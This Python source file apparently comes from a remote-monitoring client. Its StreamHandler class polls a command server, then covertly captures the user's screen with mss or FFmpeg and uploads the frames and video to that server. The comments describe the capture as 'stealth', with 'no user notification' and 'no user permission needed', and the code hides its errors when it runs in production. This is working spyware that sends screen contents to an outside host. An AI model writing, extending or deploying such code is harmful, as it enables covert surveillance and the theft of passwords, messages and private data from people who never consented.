# Stream handler for real-time screen streaming using Python libraries (stealth)

import subprocess
import threading
import logging
import time
import json
import base64
import requests
from datetime import datetime
import platform
import sys
import os
import mss
from PIL import Image
import io

try:
    import websocket
except ImportError:
    websocket = None

# Add src to path for imports
sys.path.append(os.path.join(os.path.dirname(__file__), '..'))
from core.config import Config

class StreamHandler:
    def __init__(self, api_client):
        self.api_client = api_client
        self.is_streaming = False
        self.ffmpeg_process = None
        self.stream_quality = 'medium'  # low, medium, high
        self.sequence = 0
        self.stream_thread = None  # Initialize thread reference
        self.video_streaming = False  # Flag for video streaming mode
        self.video_thread = None
        
        # Stream settings
        self.stream_settings = {
            'low': {
                'resolution': '1280x720',
                'bitrate': '1000k',
                'fps': 15,
                'scale': '-1:720'
            },
            'medium': {
                'resolution': '1920x1080', 
                'bitrate': '2500k',
                'fps': 24,
                'scale': '-1:1080'
            },
            'high': {
                'resolution': '2560x1440',
                'bitrate': '5000k',
                'fps': 30,
                'scale': '-1:1440'
            }
        }
        
    def start_streaming(self):
        """Start stream handler service - wait for requests"""
        logging.info("Stream handler started - waiting for stream requests")
        
        while True:
            try:
                # Check for streaming requests from server
                self.check_stream_requests()
                time.sleep(2)
            except Exception as e:
                logging.error(f"Stream handler error: {str(e)}")
                time.sleep(5)
                
    def check_stream_requests(self):
        """Check server for streaming requests (stealth - no user notification)"""
        try:
            # Check if this is production server
            is_production = '103.129.149.67' in self.api_client.server_url
            
            if is_production:
                # Production server - use getStreamRequest endpoint
                try:
                    response = requests.get(
                        f"{self.api_client.server_url}/api/stream/request/{Config.CLIENT_ID}",
                        timeout=5
                    )
                    
                    if response.status_code == 200:
                        data = response.json()
                        
                        if data.get('quality') and not self.is_streaming:
                            # Start video streaming
                            self.stream_quality = data.get('quality', 'medium')
                            self.is_streaming = True
                            self.video_streaming = True  # Enable video mode
                            logging.info(f"Starting production video stream with quality: {self.stream_quality}")
                            self.start_video_streaming()
                            return True
                            
                        elif not data.get('quality') and self.is_streaming:
                            # Stop streaming
                            self.is_streaming = False
                            self.video_streaming = False
                            logging.info("Stopping production video stream")
                            self.stop_video_streaming()
                            return False
                            
                except requests.RequestException:
                    pass
                return False
            
            response = requests.get(
                f"{Config.SERVER_URL}/api/stream/request/{Config.CLIENT_ID}",
                timeout=10
            )
            
            if response.status_code == 200:
                data = response.json()
                
                if data.get('quality') and not self.is_streaming:
                    # Start stealth streaming
                    self.stream_quality = data['quality']
                    self.is_streaming = True
                    logging.info(f"Starting stealth stream with quality: {self.stream_quality}")
                    self.start_stealth_streaming()
                    return True
                    
                elif not data.get('quality') and self.is_streaming:
                    # Stop streaming
                    self.is_streaming = False
                    logging.info("Stopping stealth stream")
                    self.stop_stealth_streaming()
                    return False
                    
        except requests.RequestException:
            # Network errors are common, don't spam logs
            pass
        except Exception as e:
            # Only log errors for local development
            is_production = '103.129.149.67' in self.api_client.server_url
            if not is_production:
                logging.error(f"Error checking stream requests: {e}")
        
        return False
            
    def start_stealth_streaming(self):
        """Start stealth screen streaming using Python libraries (no user permission needed)"""
        try:
            def stream_worker():
                """Worker thread for stealth streaming"""
                try:
                    # Check if mss is available
                    import mss
                    from PIL import Image
                    import io
                    
                    fps = self.stream_settings[self.stream_quality]['fps']
                    frame_interval = 1.0 / fps
                    
                    with mss.mss() as sct:
                        # Get primary monitor
                        monitor = sct.monitors[1]
                        
                        while self.is_streaming:
                            try:
                                # Capture screenshot (stealth - no notification)
                                screenshot = sct.grab(monitor)
                                
                                # Convert to PIL Image
                                img = Image.frombytes("RGB", screenshot.size, screenshot.bgra, "raw", "BGRX")
                                
                                # Resize based on quality
                                quality_settings = self.stream_settings[self.stream_quality]
                                if 'scale' in quality_settings:
                                    width = int(quality_settings['scale'].split(':')[1])
                                    if width != img.height:
                                        ratio = width / img.height
                                        new_width = int(img.width * ratio)
                                        img = img.resize((new_width, width), Image.Resampling.LANCZOS)
                                
                                # Convert to JPEG with compression
                                img_buffer = io.BytesIO()
                                quality = 85 if self.stream_quality == 'high' else 70 if self.stream_quality == 'medium' else 50
                                img.save(img_buffer, format='JPEG', quality=quality, optimize=True)
                                
                                # Encode to base64
                                img_data = base64.b64encode(img_buffer.getvalue()).decode('utf-8')
                                
                                # Send to server
                                self.send_stream_chunk(img_data)
                                
                                time.sleep(frame_interval)
                                
                            except Exception as frame_error:
                                logging.error(f"Frame capture error: {frame_error}")
                                time.sleep(1)
                                
                except ImportError as import_error:
                    logging.error(f"Required libraries not available for streaming: {import_error}")
                    self.is_streaming = False
                except Exception as worker_error:
                    logging.error(f"Stream worker error: {worker_error}")
                    self.is_streaming = False
                            
            # Start streaming thread
            if hasattr(self, 'stream_thread') and self.stream_thread and self.stream_thread.is_alive():
                logging.warning("Stream thread already running")
                return
                
            self.stream_thread = threading.Thread(target=stream_worker, daemon=True)
            self.stream_thread.start()
            logging.info(f"Stealth streaming started with quality: {self.stream_quality}")
            
        except Exception as e:
            logging.error(f"Failed to start stealth streaming: {e}")
            self.is_streaming = False
            
        except Exception as e:
            logging.error(f"Failed to start stealth streaming: {e}")
            
    def stop_stealth_streaming(self):
        """Stop stealth streaming"""
        self.is_streaming = False
        if hasattr(self, 'stream_thread') and self.stream_thread:
            # Wait for thread to finish naturally
            try:
                self.stream_thread.join(timeout=2)
            except:
                pass
            self.stream_thread = None
        logging.info("Stealth streaming stopped")
    
    def start_video_streaming(self):
        """Start real video streaming using FFmpeg (not screenshots)"""
        try:
            if self.video_streaming and self.video_thread and self.video_thread.is_alive():
                logging.warning("Video streaming already running")
                return
                
            def video_stream_worker():
                """Worker thread for real video streaming using FFmpeg"""
                try:
                    import platform
                    import subprocess
                    
                    # Get quality settings
                    settings = self.stream_settings[self.stream_quality]
                    
                    # Platform-specific screen capture settings
                    if platform.system() == 'Darwin':  # macOS
                        input_args = [
                            '-f', 'avfoundation',
                            '-i', '1',  # Screen capture device (Capture screen 0)
                            '-r', str(settings['fps'])
                        ]
                    elif platform.system() == 'Windows':
                        input_args = [
                            '-f', 'gdigrab', 
                            '-i', 'desktop',
                            '-r', str(settings['fps'])
                        ]
                    else:  # Linux
                        input_args = [
                            '-f', 'x11grab',
                            '-i', ':0.0',
                            '-r', str(settings['fps'])
                        ]
                    
                    # FFmpeg command for video streaming 
                    ffmpeg_cmd = [
                        'ffmpeg',
                        '-y',  # Overwrite output
                    ] + input_args + [
                        '-vf', f'scale={settings["scale"]}',
                        '-c:v', 'libx264',
                        '-preset', 'ultrafast',
                        '-tune', 'zerolatency', 
                        '-b:v', settings['bitrate'],
                        '-maxrate', settings['bitrate'],
                        '-bufsize', '2M',
                        '-g', str(settings['fps'] * 2),  # Keyframe interval
                        '-f', 'mp4',
                        '-movflags', '+faststart+frag_keyframe+empty_moov',
                        'pipe:1'  # Output to stdout
                    ]
                    
                    logging.info(f"Starting video stream with FFmpeg: {' '.join(ffmpeg_cmd[:5])}...")
                    
                    # Start FFmpeg process
                    self.ffmpeg_process = subprocess.Popen(
                        ffmpeg_cmd,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE,
                        bufsize=0
                    )
                    
                    # Read video chunks and send to server
                    chunk_size = 65536  # 64KB chunks
                    
                    while self.video_streaming and self.ffmpeg_process:
                        chunk = self.ffmpeg_process.stdout.read(chunk_size)
                        
                        if not chunk:
                            break
                            
                        # Send video chunk to server
                        if self.send_video_chunk(chunk):
                            logging.debug(f"Video chunk {self.sequence} sent successfully")
                        else:
                            logging.debug(f"Failed to send video chunk {self.sequence}")
                            
                        time.sleep(0.01)  # Small delay to prevent overwhelming
                        
                except Exception as e:
                    logging.error(f"Video streaming error: {e}")
                finally:
                    if self.ffmpeg_process:
                        try:
                            self.ffmpeg_process.terminate()
                            self.ffmpeg_process.wait(timeout=5)
                        except:
                            self.ffmpeg_process.kill()
                        self.ffmpeg_process = None
                    self.video_streaming = False
                    
            # Start video streaming thread
            self.video_thread = threading.Thread(target=video_stream_worker, daemon=True)
            self.video_thread.start()
            logging.info(f"Real video streaming started with quality: {self.stream_quality}")
            
        except Exception as e:
            logging.error(f"Video streaming startup error: {e}")
            # Fallback to MSS-based screen capture
            self.start_mss_video_streaming()
            
    def start_mss_video_streaming(self):
        """Fallback video streaming using MSS (Python screenshot library)"""
        try:
            if self.video_streaming and self.video_thread and self.video_thread.is_alive():
                logging.warning("MSS Video streaming already running")
                return
                
            def mss_video_worker():
                """Worker thread for MSS-based video streaming"""
                try:
                    import mss
                    import io
                    from PIL import Image
                    
                    # Get quality settings
                    settings = self.stream_settings[self.stream_quality]
                    target_fps = settings['fps']
                    frame_interval = 1.0 / target_fps
                    
                    # Parse scale settings for resize
                    scale_setting = settings['scale']
                    if scale_setting.startswith('-1:'):
                        target_height = int(scale_setting.split(':')[1])
                        target_width = None  # Will be calculated to maintain aspect ratio
                    else:
                        target_width, target_height = map(int, scale_setting.split('x'))
                    
                    logging.info(f"Starting MSS video stream with quality: {self.stream_quality}, target fps: {target_fps}")
                    
                    with mss.mss() as sct:
                        monitor = sct.monitors[1]  # Primary monitor
                        
                        while self.video_streaming:
                            start_time = time.time()
                            
                            # Capture screenshot
                            screenshot = sct.grab(monitor)
                            
                            # Convert to PIL Image
                            img = Image.frombytes('RGB', screenshot.size, screenshot.bgra, 'raw', 'BGRX')
                            
                            # Resize based on quality settings
                            if target_width and target_height:
                                img = img.resize((target_width, target_height), Image.Resampling.LANCZOS)
                            elif target_height:
                                # Calculate width maintaining aspect ratio
                                aspect_ratio = img.width / img.height
                                new_width = int(target_height * aspect_ratio)
                                img = img.resize((new_width, target_height), Image.Resampling.LANCZOS)
                            
                            # Convert to JPEG
                            buffer = io.BytesIO()
                            img.save(buffer, format='JPEG', quality=85)
                            img_data = buffer.getvalue()
                            
                            # Encode to base64 and send
                            import base64
                            encoded_frame = base64.b64encode(img_data).decode('utf-8')
                            
                            # Send frame using existing chunk endpoint
                            if self.send_video_chunk(img_data):
                                logging.debug(f"MSS video frame {self.sequence} sent successfully")
                            else:
                                logging.debug(f"Failed to send MSS video frame {self.sequence}")
                            
                            # Frame rate control
                            elapsed = time.time() - start_time
                            sleep_time = max(0, frame_interval - elapsed)
                            if sleep_time > 0:
                                time.sleep(sleep_time)
                                
                except Exception as e:
                    logging.error(f"MSS video streaming error: {e}")
                finally:
                    self.video_streaming = False
                    logging.info("MSS video streaming stopped")
                    
            # Start MSS video streaming thread
            self.video_thread = threading.Thread(target=mss_video_worker, daemon=True)
            self.video_thread.start()
            logging.info(f"MSS video streaming started as fallback with quality: {self.stream_quality}")
            
        except Exception as e:
            logging.error(f"Failed to start video streaming: {e}")
            self.video_streaming = False
            
    def stop_video_streaming(self):
        """Stop real video streaming"""
        self.video_streaming = False
        
        # Stop FFmpeg process
        if self.ffmpeg_process:
            try:
                self.ffmpeg_process.terminate()
                self.ffmpeg_process.wait(timeout=5)
            except subprocess.TimeoutExpired:
                self.ffmpeg_process.kill()
            except:
                pass
            self.ffmpeg_process = None
            
        # Wait for video thread to finish
        if self.video_thread:
            try:
                self.video_thread.join(timeout=3)
            except:
                pass
            self.video_thread = None
            
        logging.info("Real video streaming stopped")
        
    def send_video_chunk(self, chunk_data):
        """Send video chunk to server using existing /api/stream/chunk endpoint"""
        try:
            # Encode video chunk to base64
            import base64
            encoded_chunk = base64.b64encode(chunk_data).decode('utf-8')
            
            video_data = {
                'chunk': encoded_chunk,  # Use same key as existing endpoint
                'sequence': self.sequence,
                'timestamp': time.time(),
                'quality': self.stream_quality,
                'chunk_size': len(chunk_data),
                'stream_type': 'video'  # Indicate this is video stream
            }
            
            # Increment sequence number
            self.sequence += 1
            
            # Send to existing chunk endpoint
            response = requests.post(
                f"{self.api_client.server_url}/api/stream/chunk/{Config.CLIENT_ID}",
                json=video_data,
                timeout=5
            )
            
            return response.status_code == 200
            
        except requests.RequestException:
            return False
        except Exception as e:
            logging.error(f"Error sending video chunk: {e}")
            return False
            
    def send_stream_chunk(self, img_data):
        """Send screenshot stream chunk to server using existing endpoint"""
        try:
            # Use existing uploadStreamChunk endpoint for all streaming
            chunk_data = {
                'chunk': img_data,  # Use 'chunk' key as expected by existing endpoint
                'sequence': self.sequence,
                'timestamp': time.time(),
                'quality': self.stream_quality,
                'stream_type': 'screenshot'  # Indicate this is screenshot stream
            }
            
            # Increment sequence number
            self.sequence += 1
            
            response = requests.post(
                f"{self.api_client.server_url}/api/stream/chunk/{Config.CLIENT_ID}",
                json=chunk_data,
                timeout=5
            )
            
            return response.status_code == 200
            
        except requests.RequestException:
            # Network errors are common during streaming
            return False
        except Exception as e:
            logging.error(f"Error sending stream chunk: {e}")
            return False
